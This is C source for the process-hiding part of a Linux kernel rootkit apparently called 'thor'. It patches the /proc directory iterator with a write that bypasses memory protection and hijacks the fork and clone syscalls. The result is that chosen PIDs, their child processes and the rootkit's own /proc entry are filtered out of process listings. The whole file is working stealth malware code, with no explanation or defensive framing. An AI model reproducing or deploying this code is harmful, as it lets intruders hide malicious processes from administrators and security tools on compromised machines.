#include "pidhider.h"

#include "config.h"
#include "helper.h"
#include "hijack.h"
#include "logging.h"
#include "procfile.h"
#include "sockethider.h"

#include <linux/fs.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/version.h>

#include <fs/proc/internal.h>

/* function prototypes */
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
static int thor_proc_iterate(struct file *file, void *dirent, filldir_t filldir);
#else
static int thor_proc_iterate(struct file *file, struct dir_context *ctx);
#endif
static int thor_proc_filldir(void *buf, const char *name, int namelen,
        loff_t offset, u64 ino, unsigned d_type);
static long thor_fork(void);
#ifdef __ARCH_WANT_SYS_CLONE
# ifdef CONFIG_CLONE_BACKWARDS
long thor_clone(unsigned long clone_flags, unsigned long newsp,
                int __user * parent_tidptr,
                int tls_val,
                int __user * child_tidptr);
# elif defined(CONFIG_CLONE_BACKWARDS2)
long thor_clone(unsigned long newsp, unsigned long clone_flags,
                int __user * parent_tidptr,
                int __user * child_tidptr,
                int tls_val);
# elif defined(CONFIG_CLONE_BACKWARDS3)
long thor_clone(unsigned long clone_flags, unsigned long newsp,
                int stack_size,
                int __user * parent_tidptr,
                int __user * child_tidptr,
                int tls_val);
# else
long thor_clone(unsigned long clone_flags, unsigned long newsp,
                int __user * parent_tidptr,
                int __user * child_tidptr,
                int tls_val);
# endif
#endif
/* node for hiding list */
struct _pid_list {
    unsigned short pid;
    struct list_head list;
};

/* hiding list */
static struct _pid_list pid_list;

/* entry of /proc */
static struct proc_dir_entry *procroot;

/* file operations of /proc */
static struct file_operations *proc_fops;

/* pointers to syscalls we need to hook/hijack */
static long (*sys_fork)(void);
#ifdef __ARCH_WANT_SYS_CLONE
# ifdef CONFIG_CLONE_BACKWARDS
static long (*sys_clone)(unsigned long clone_flags, unsigned long newsp,
                int __user * parent_tidptr,
                int tls_val,
                int __user * child_tidptr);
# elif defined(CONFIG_CLONE_BACKWARDS2)
static long (*sys_clone)(unsigned long newsp, unsigned long clone_flags,
                int __user * parent_tidptr,
                int __user * child_tidptr,
                int tls_val);
# elif defined(CONFIG_CLONE_BACKWARDS3)
static long (*sys_clone)(unsigned long clone_flags, unsigned long newsp,
                int stack_size,
                int __user * parent_tidptr,
                int __user * child_tidptr,
                int tls_val);
# else
static long (*sys_clone)(unsigned long clone_flags, unsigned long newsp,
                int __user * parent_tidptr,
                int __user * child_tidptr,
                int tls_val);
# endif
#endif

/* pointer to original proc_iterate function */
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
static int (*orig_proc_iterate)(struct file *file, void *dirent, filldir_t filldir);
#else
static int (*orig_proc_iterate)(struct file *, struct dir_context *);
#endif

/* pointer to original proc_filldir function */
static int (*orig_proc_filldir)(void *buf, const char *name, int namelen,
        loff_t offset, u64 ino, unsigned d_type);

int pidhider_init(void)
{
    void *iterate_addr;

    INIT_LIST_HEAD(&pid_list.list);

    LOG_INFO("hooking /proc readdir / iterate");

    /* insert our modified iterate for /proc */
    procroot = procfile->parent;
    proc_fops = (struct file_operations*) procroot->proc_fops;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    orig_proc_iterate = proc_fops->readdir;
#else
    orig_proc_iterate = proc_fops->iterate;
#endif

    iterate_addr = (void*) &(thor_proc_iterate);
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    write_no_prot(&proc_fops->readdir, &iterate_addr, sizeof(void*));
#else
    write_no_prot(&proc_fops->iterate, &iterate_addr, sizeof(void*));
#endif

    sys_fork = (void*) kallsyms_lookup_name("sys_fork");

    if (sys_fork == NULL) {
        LOG_ERROR("failed to lookup syscall fork");
        return -1;
    }

    sys_clone = (void*) kallsyms_lookup_name("sys_clone");

    if (sys_clone == NULL) {
        LOG_ERROR("failed to lookup syscall clone");
        return -1;
    }

    LOG_INFO("hijacking fork");

    hijack(sys_fork, thor_fork);
#ifdef __ARCH_WANT_SYS_CLONE
    LOG_INFO("hijacking clone");
    hijack(sys_clone, thor_clone);
#endif

    return 0;
}

void pidhider_cleanup(void)
{
    if (proc_fops != NULL && orig_proc_iterate != NULL) {
        void *iterate_addr = orig_proc_iterate;

        LOG_INFO("unhooking /proc readdir / iterate");

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
        write_no_prot(&proc_fops->readdir, &iterate_addr, sizeof(void*));
#else
        write_no_prot(&proc_fops->iterate, &iterate_addr, sizeof(void*));
#endif
    }

    clear_pid_list();

    if (sys_fork != NULL) {
        LOG_INFO("unhijacking fork");
        unhijack(sys_fork);
    }
#ifdef __ARCH_WANT_SYS_CLONE
    if (sys_clone != NULL) {
        LOG_INFO("unhijacking clone");
        unhijack(sys_clone);
    }
#endif
}

static long thor_fork(void)
{
    bool hidden = false;
    long ret;

    /* check if process calling fork is hidden */
    hidden = is_pid_hidden(current->pid);

    unhijack(sys_fork);
    ret = sys_fork();
    hijack(sys_fork, thor_fork);

    /* if mother process was hidden child process */
    if(hidden && ret != -1 && ret != 0) {
        LOG_INFO("(fork) hiding child process: %hu", (unsigned short) ret);
        add_to_pid_list((unsigned short) ret);
    }

    return ret;
}

#ifdef __ARCH_WANT_SYS_CLONE
# ifdef CONFIG_CLONE_BACKWARDS
long thor_clone(unsigned long clone_flags, unsigned long newsp,
                int __user * parent_tidptr,
                int tls_val,
                int __user * child_tidptr)
# elif defined(CONFIG_CLONE_BACKWARDS2)
long thor_clone(unsigned long newsp, unsigned long clone_flags,
                int __user * parent_tidptr,
                int __user * child_tidptr,
                int tls_val)
# elif defined(CONFIG_CLONE_BACKWARDS3)
long thor_clone(unsigned long clone_flags, unsigned long newsp,
                int stack_size,
                int __user * parent_tidptr,
                int __user * child_tidptr,
                int tls_val)
# else
long thor_clone(unsigned long clone_flags, unsigned long newsp,
                int __user * parent_tidptr,
                int __user * child_tidptr,
                int tls_val)
# endif
{
    bool hidden = false;
    long ret;

    /* check if process calling clone is hidden */
    hidden = is_pid_hidden(current->pid);

    unhijack(sys_clone);
# ifdef CONFIG_CLONE_BACKWARDS
    ret = sys_clone(clone_flags, newsp,
                parent_tidptr,
                tls_val,
                child_tidptr);
# elif defined(CONFIG_CLONE_BACKWARDS2)
    ret = sys_clone(newsp, clone_flags,
                parent_tidptr,
                child_tidptr,
                tls_val);
# elif defined(CONFIG_CLONE_BACKWARDS3)
    ret = sys_clone(clone_flags, newsp,
                stack_size,
                parent_tidptr,
                child_tidptr,
                tls_val);
# else
    ret = sys_clone(clone_flags, newsp,
                parent_tidptr,
                child_tidptr,
                tls_val);
# endif
    hijack(sys_clone, thor_clone);

    /* if mother process was hidden child process */
    if (hidden && ret != -1 && ret != 0) {
        LOG_INFO("(clone) hiding child process: %hu", (unsigned short) ret);
        add_to_pid_list((unsigned short) ret);
    }

    return ret;
}
#endif


#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
static int thor_proc_iterate(struct file *file, void *dirent, filldir_t filldir)
{
    orig_proc_filldir = filldir;
    return orig_proc_iterate(file, dirent, thor_proc_filldir);
}
#else
static int thor_proc_iterate(struct file *file, struct dir_context *ctx)
{
    int ret;
    filldir_t *ctx_actor;

    /* capture original filldir function */
    orig_proc_filldir = ctx->actor;

    /* cast away const from ctx->actor */
    ctx_actor = (filldir_t*) (&ctx->actor);

    /* store our filldir in ctx->actor */
    *ctx_actor = thor_proc_filldir;
    ret = orig_proc_iterate(file, ctx);

    /* restore original filldir */
    *ctx_actor = orig_proc_filldir;

    return ret;
}
#endif

static int thor_proc_filldir(void *buf, const char *name, int namelen,
        loff_t offset, u64 ino, unsigned d_type)
{
    struct _pid_list *tmp;
    char pidname[6];
    unsigned short pid;
    unsigned int ipid;

    strncpy(pidname, name, MIN(namelen, 6));
    pidname[MIN(namelen, 5)] = 0;

    kstrtoint(pidname, 10, &ipid);
    pid = (unsigned short) ipid;

    /* hide specified PIDs */
    list_for_each_entry(tmp, &(pid_list.list), list) {
        if (pid == tmp->pid) {
            LOG_INFO("hiding pid %d", pid);
            return 0;
        }
    }

    /* hide thor itself */
    if (strcmp(name, THOR_PROCFILE) == 0) {
        LOG_INFO("hiding /proc/" THOR_PROCFILE);
        return 0;
    }

    return orig_proc_filldir(buf, name, namelen, offset, ino, d_type);
}

void add_to_pid_list(const unsigned short pid)
{
    struct _pid_list *tmp;

    tmp = (struct _pid_list*) kmalloc(sizeof(struct _pid_list), GFP_KERNEL);
    tmp->pid = pid;

    LOG_INFO("adding pid %d to hiding list", tmp->pid);

    list_add(&(tmp->list), &(pid_list.list));
}

void remove_from_pid_list(const unsigned short pid)
{
    struct _pid_list *tmp;
    struct list_head *pos, *q;

    list_for_each_safe(pos, q, &(pid_list.list)) {
        tmp = list_entry(pos, struct _pid_list, list);
        if (pid == tmp->pid) {
            LOG_INFO("removing pid %d from hiding list", pid);
            list_del(pos);
            kfree(tmp);
        }
    }
}

void clear_pid_list(void)
{
    struct _pid_list *tmp;
    struct list_head *pos, *q;

    LOG_INFO("clearing pid hiding list");

    list_for_each_safe(pos, q, &(pid_list.list)) {
        tmp = list_entry(pos, struct _pid_list, list);
        list_del(pos);
        kfree(tmp);
    }
}

bool is_pid_hidden(const unsigned short pid)
{
    struct _pid_list *tmp;

    list_for_each_entry(tmp, &(pid_list.list), list) {
        if (pid == tmp->pid) {
            return true;
        }
    }

    return false;
}
